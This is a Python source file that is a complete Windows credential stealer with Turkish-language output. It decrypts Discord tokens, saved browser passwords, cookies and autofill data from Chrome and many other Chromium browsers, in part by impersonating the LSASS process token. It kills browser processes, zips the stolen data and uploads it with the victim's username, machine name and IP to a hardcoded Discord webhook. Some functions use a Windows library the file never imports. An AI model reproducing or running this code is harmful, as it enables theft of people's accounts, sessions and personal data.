\
import os
import io
import json
import struct
import ctypes
import shutil
import sqlite3
import pathlib
import binascii
import subprocess
import base64
import re
import requests
import datetime
import glob
import sys
import zipfile
import random  
from pathlib import Path
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305
from urllib.parse import urlparse
from datetime import datetime

try:
    import win32crypt
except ImportError:
    sys.exit(1)


WEBHOOK_URL = "https://discord.com/api/webhooks/1453716755972231210/zPLoTdZCCCTHMHjkkpC6uaQlHUVFPo5f1py2QGNuTvXB-B_QgjM6U-oJP3GIqLuWKpSO"

PATHS_DISCORD = {
    'Discord': os.path.join(os.getenv("APPDATA"), "discord"),
    'Discord Canary': os.path.join(os.getenv("APPDATA"), "discordcanary"),
    'Discord PTB': os.path.join(os.getenv("APPDATA"), "discordptb"),
    'Lightcord': os.path.join(os.getenv("APPDATA"), "Lightcord")
}

BROWSER_BASES = [
    os.path.join(os.getenv("LOCALAPPDATA"), "Google"),
    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge"),
    os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser"),
    os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware"),
    os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
    os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
    os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi"),
    os.path.join(os.getenv("LOCALAPPDATA"), "Chromium"),
    os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser"),
    os.path.join(os.getenv("LOCALAPPDATA"), "Torch"),
    os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon"),
    os.path.join(os.getenv("LOCALAPPDATA"), "360Browser"),
    os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc"),
    os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser"),
    os.path.join(os.getenv("LOCALAPPDATA"), "Slimjet"),
]

PATTERNS = ["**/Login Data", "**/Cookies", "**/Web Data"]

def get_ip():
    try:
        return requests.get("https://api.ipify.org?format=json", timeout=5).json()["ip"]
    except:
        return "Bilinmiyor"

def get_discord_master_key(app_path):
    local_state = os.path.join(app_path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_discord_token(master_key, encrypted_str):
    try:
        encrypted_data = base64.b64decode(encrypted_str.split("dQw4w9WgXcQ:")[1])
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:-16]
        tag = encrypted_data[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.rstrip(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10").decode("utf-8")
    except:
        try:
            nonce = encrypted_data[3:15]
            ciphertext = encrypted_data[15:-16]
            tag = encrypted_data[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode("utf-8").rstrip("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10")
        except:
            return None

def save_discord_token_info_to_lines(token, source, ip, pc_name, username):
    lines = []
    try:
        headers = {"Authorization": token}
        r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
        if r.status_code != 200:
            status = "Geçersiz"
            user = {}
        else:
            status = "Geçerli"
            user = r.json()
        lines.append(f"Kaynak: {source} | Durum: {status}")
        lines.append(f"Token: {token}")
        if status == "Geçerli":
            lines.append(f"Kullanıcı: {user.get('username','N/A')}#{user.get('discriminator','0000')} ({user.get('global_name','')})")
            lines.append(f"Email: {user.get('email','Yok')}")
        lines.append("-" * 100)
        lines.append("")
    except:
        lines.append(f"Kaynak: {source} | Hata")
        lines.append(f"Token: {token}")
        lines.append("-" * 100)
        lines.append("")
    return lines

def extract_discord_tokens():
    data_list = []
    ip = get_ip()
    pc_name = os.getenv("COMPUTERNAME", "Bilinmiyor")
    username = os.getenv("USERNAME", "Bilinmiyor")

    header = f"X - {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
    header += f"IP: {ip} | PC: {pc_name} | Kullanıcı: {username}\n"
    header += "=" * 100 + "\n\n"

    content_lines = [header]
    found_tokens = set()

    for app_name, app_path in PATHS_DISCORD.items():
        if not os.path.exists(app_path):
            continue
        leveldb_path = os.path.join(app_path, "Local Storage", "leveldb")
        if not os.path.exists(leveldb_path):
            continue
        master_key = get_discord_master_key(app_path)
        if not master_key:
            continue
        for file_name in os.listdir(leveldb_path):
            if not file_name.endswith((".ldb", ".log")):
                continue
            file_path = os.path.join(leveldb_path, file_name)
            try:
                content = Path(file_path).read_bytes().decode("utf-8", errors="ignore")
            except:
                continue
            for match in re.findall(r'dQw4w9WgXcQ:[A-Za-z0-9+/=]+', content):
                token = decrypt_discord_token(master_key, match)
                if token and len(token) > 50 and token not in found_tokens:
                    found_tokens.add(token)
                    content_lines.extend(save_discord_token_info_to_lines(token, app_name, ip, pc_name, username))
            for match in re.findall(r'(mfa\.[A-Za-z0-9_-]{84}|[A-Za-z0-9_-]{23,28}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,100})', content):
                if len(match) > 50 and match not in found_tokens:
                    found_tokens.add(match)
                    content_lines.extend(save_discord_token_info_to_lines(match, app_name, ip, pc_name, username))

    if len(content_lines) > 4: 
        data_list.append(("discord/tokens.txt", "\n".join(content_lines).encode('utf-8')))

    return data_list

def get_browser_master_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            ls = json.load(f)
        enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(buffer, master_key):
    if not buffer or len(buffer) < 15:
        return ""
    try:
        iv = buffer[3:15]
        payload = buffer[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)[:-16]
        return decrypted.decode('utf-8')
    except:
        return ""

def steal_from_other_browsers():
    data_list = []
    found_files = []
    for base in BROWSER_BASES:
        if not os.path.exists(base):
            continue
        for pattern in PATTERNS:
            matches = glob.glob(os.path.join(base, pattern), recursive=True)
            found_files.extend(matches)

    for file_path in found_files:
        file_path = os.path.normpath(file_path)
        if not os.path.exists(file_path):
            continue

        path_str = file_path.lower()
        if "opera gx" in path_str: browser = "OperaGX"
        elif "opera stable" in path_str: browser = "Opera"
        elif "edge" in path_str: browser = "Edge"
        elif "yandex" in path_str: browser = "Yandex"
        elif "brave" in path_str: browser = "Brave"
        elif "vivaldi" in path_str: browser = "Vivaldi"
        else: browser = "Unknown"

        parts = Path(file_path).parts
        try:
            user_data_idx = max(i for i, p in enumerate(parts) if "user data" in p.lower() or "opera" in p.lower())
            profile = parts[user_data_idx + 1] if len(parts) > user_data_idx + 1 else "Default"
        except:
            profile = "Default"

        try:
            user_data_idx = max(i for i, p in enumerate(parts) if "user data" in p.lower() or "opera" in p.lower())
            user_data_path = str(Path(*parts[:user_data_idx + 1]))
        except:
            user_data_path = str(Path(file_path).parent.parent)

        local_state = os.path.join(user_data_path, "Local State")
        master_key = get_browser_master_key(local_state)

        base_name = Path(file_path).name
        temp_db = pathlib.Path(os.environ['TEMP']) / f"temp_{random.randbytes(4).hex()}.db"

        if "Login Data" in base_name:
            try:
                shutil.copy2(file_path, temp_db)
                con = sqlite3.connect(temp_db)
                cur = con.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cur.fetchall()
                lines = []
                for url, user, enc_pass in rows:
                    plain = decrypt_value(enc_pass, master_key) if enc_pass and master_key else ""
                    if not user or not plain: continue
                    clean_url = url.replace("https://", "").replace("http://", "").split('/')[0]
                    lines.append(f"{clean_url}:{user}:{plain}")
                if lines:
                    data_list.append((f"browsers/{browser}/{profile}/accounts.txt", "\n".join(lines).encode('utf-8')))
                con.close()
            except: pass
            finally:
                if temp_db.exists():
                    os.remove(temp_db)

        elif "Cookies" in base_name:
            try:
                shutil.copy2(file_path, temp_db)
                con = sqlite3.connect(temp_db)
                cur = con.cursor()
                cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
                rows = cur.fetchall()
                lines = []
                for host, name, path, expires, secure, httponly, enc_val in rows:
                    val = decrypt_value(enc_val, master_key) if enc_val and master_key else ""
                    lines.append(f"{host}\tTRUE\t{path}\t{str(bool(secure)).upper()}\t{expires or 2597573456}\t{name}\t{val}")
                if lines:
                    data_list.append((f"browsers/{browser}/{profile}/cookies.txt", "\n".join(lines).encode('utf-8')))
                con.close()
            except: pass
            finally:
                if temp_db.exists():
                    os.remove(temp_db)

    return data_list

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(type=gdef.TokenImpersonation, impersonation_level=gdef.SecurityImpersonation)
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError("Unsupported flag")
    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * buffer_size)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size, ctypes.byref(pcbResult), 0x40)
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

def get_encryption_version(encrypted_value):
    if len(encrypted_value) < 3: return "DPAPI"
    prefix = encrypted_value[:3]
    if prefix == b"v10": return "v10"
    elif prefix == b"v11": return "v11"
    elif prefix == b"v20": return "v20"
    return "DPAPI"

def decrypt_dpapi_value(encrypted_value):
    try:
        with impersonate_lsass():
            return windows.crypto.dpapi.unprotect(encrypted_value).decode('utf-8')
    except:
        return None

def decrypt_v10_v11_value(encrypted_value):
    try:
        with impersonate_lsass():
            return windows.crypto.dpapi.unprotect(encrypted_value).decode('utf-8')
    except:
        return None

def decrypt_v20_password(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        return None

def universal_password_decrypt(encrypted_value, master_key=None):
    if not encrypted_value: return None
    version = get_encryption_version(encrypted_value)
    if version == "v20":
        if master_key is None: return None
        return decrypt_v20_password(encrypted_value, master_key)
    elif version in ["v10", "v11"]:
        return decrypt_v10_v11_value(encrypted_value)
    else:
        return decrypt_dpapi_value(encrypted_value)

def universal_decrypt(encrypted_value, master_key=None):
    if not encrypted_value: return None
    version = get_encryption_version(encrypted_value)
    if version == "v20" and master_key:
        try:
            iv = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(ciphertext, tag)[32:].decode('utf-8')
        except:
            return None
    elif version in ["v10", "v11"]:
        return decrypt_v10_v11_value(encrypted_value)
    else:
        return decrypt_dpapi_value(encrypted_value)

def fetch_sqlite_copy(db_path):
    temp_path = pathlib.Path(os.environ['TEMP']) / f"temp_{random.randbytes(4).hex()}.db"
    shutil.copy2(db_path, temp_path)
    return str(temp_path)

def get_master_key():
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["app_bound_encrypted_key"])[4:]
        with impersonate_lsass():
            key_blob_system = windows.crypto.dpapi.unprotect(key_blob_encrypted)
        key_blob_user = windows.crypto.dpapi.unprotect(key_blob_system)
        parsed = parse_key_blob(key_blob_user)
        return derive_v20_master_key(parsed)
    except:
        return None

def chrome_main():
    data_list = []
    user_profile = os.environ['USERPROFILE']
    chrome_user_data = pathlib.Path(user_profile) / "AppData" / "Local" / "Google" / "Chrome" / "User Data"
    master_key = get_master_key()
    if master_key is None:
        return data_list

    profiles = [p for p in chrome_user_data.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
    for profile_dir in profiles:
        profile_name = profile_dir.name
        cookie_db_path = profile_dir / "Network" / "Cookies"
        login_db_path = profile_dir / "Login Data"
        webdata_db_path = profile_dir / "Web Data"
        try:
            cookie_copy = fetch_sqlite_copy(str(cookie_db_path))
            con = sqlite3.connect(cookie_copy)
            cur = con.cursor()
            cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies")
            rows = cur.fetchall()
            lines = []
            for host, name, path, expires, secure, httponly, enc_val in rows:
                val = universal_decrypt(enc_val, master_key) if enc_val else ""
                lines.append(f"{host}\tTRUE\t{path}\t{str(bool(secure)).upper()}\t{expires or 2597573456}\t{name}\t{val}")
            if lines:
                data_list.append((f"chrome/{profile_name}/cookies.txt", "\n".join(lines).encode('utf-8')))
            con.close()
            os.remove(cookie_copy)
        except: pass
        try:
            con = sqlite3.connect(f"file:{login_db_path}?mode=ro", uri=True)
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins")
            rows = cur.fetchall()
            lines = []
            for url, user, enc_pass in rows:
                if not user: continue
                plain = universal_password_decrypt(enc_pass, master_key)
                if not plain: continue
                parsed = urlparse(url)
                clean_url = parsed.netloc
                if any(k in parsed.path.lower() for k in ["login","sign","auth","account"]):
                    clean_url += parsed.path
                lines.append(f"{clean_url}:{user}:{plain}")
            if lines:
                data_list.append((f"chrome/{profile_name}/accounts.txt", "\n".join(lines).encode('utf-8')))
            con.close()
        except: pass
        try:
            web_copy = fetch_sqlite_copy(str(webdata_db_path))
            con = sqlite3.connect(web_copy)
            cur = con.cursor()
            cur.execute("SELECT name, value FROM autofill")
            rows = cur.fetchall()
            lines = []
            for name, value in rows:
                if not name or not name.strip(): continue
                val = universal_decrypt(value, master_key) if isinstance(value, bytes) else value
                lines.append(f"Field: {name}\nValue: {val}\n")
            if lines:
                data_list.append((f"chrome/{profile_name}/auto_fills.txt", "\n".join(lines).encode('utf-8')))
            con.close()
            os.remove(web_copy)
        except: pass

    return data_list

if __name__ == "__main__":
    if not is_admin():
        sys.exit(1)

    try:
        subprocess.run([
            "taskkill", "/F",
            "/IM", "chrome.exe", "/IM", "msedge.exe", "/IM", "brave.exe",
            "/IM", "opera.exe", "/IM", "yandexbrowser.exe", "/IM", "vivaldi.exe",
            "/IM", "chromium.exe", "/IM", "dragon.exe", "/IM", "360chrome.exe",
            "/IM", "browser.exe"
        ], capture_output=True, creationflags=0x08000000)
    except: pass

    all_data = []
    all_data.extend(extract_discord_tokens())
    all_data.extend(chrome_main())
    all_data.extend(steal_from_other_browsers())

    if not all_data:
        sys.exit(0)

    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        username = os.getenv("USERNAME", "user")
        pc_name = os.getenv("COMPUTERNAME", "pc")
        ip = get_ip()
        zip_filename = f"{username}_{pc_name}_{ip}_{timestamp}.zip"

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zipf:
            for arcname, file_bytes in all_data:
                zipf.writestr(arcname, file_bytes)

        zip_buffer.seek(0)

        files = {"file": (zip_filename, zip_buffer, "application/zip")}
        payload = {
            "content": f"**Kullanıcı:** {username}@{pc_name}\n**IP:** {ip}\n**Tarih:** {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
        }
        requests.post(WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files=files, timeout=60)
    except: pass
